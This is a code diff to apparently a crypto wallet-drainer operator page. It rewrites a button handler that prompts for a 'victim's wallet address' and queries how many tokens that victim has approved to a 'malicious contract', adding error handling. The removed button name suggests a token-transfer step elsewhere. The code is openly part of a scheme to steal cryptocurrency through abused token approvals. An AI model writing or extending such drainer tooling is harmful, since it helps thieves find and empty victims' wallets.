@@ -286,23 +286,29 @@
             }
         }
 
-  document.getElementById("transferTokensBtn").addEventListener("click", async () => {
+document.getElementById("checkAllowanceBtn").addEventListener("click", async () => {
     const victimAddress = prompt("Enter victim's wallet address:");
     if (victimAddress) {
-        // Get the allowance granted to the malicious contract
-        const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
-        
-        // Convert the allowance to a BigNumber to avoid overflow
-        const allowanceBN = web3.utils.toBN(allowance);
+        try {
+            // Call the checkAllowance function from the malicious contract
+            const allowance = await contract.methods.checkAllowance(victimAddress).call();
+            
+            // Convert the allowance to a BigNumber (if needed)
+            const allowanceBN = web3.utils.toBN(allowance);
 
-        // Check if the allowance is greater than 0
-        if (allowanceBN.gt(web3.utils.toBN(0))) {
-            alert(`The victim has granted an allowance of ${web3.utils.fromWei(allowanceBN, "ether")} tokens to the malicious contract.`);
-        } else {
-            alert("The victim has not granted any allowance to the malicious contract.");
+            // Check if the allowance is greater than 0
+            if (allowanceBN.gt(web3.utils.toBN(0))) {
+                alert(`The victim has granted an allowance of ${allowanceBN.toString()} tokens to the malicious contract.`);
+            } else {
+                alert("The victim has not granted any allowance to the malicious contract.");
+            }
+        } catch (error) {
+            alert("An error occurred while checking the allowance.");
+            console.error(error);
         }
     }
 });
+
 
 
 
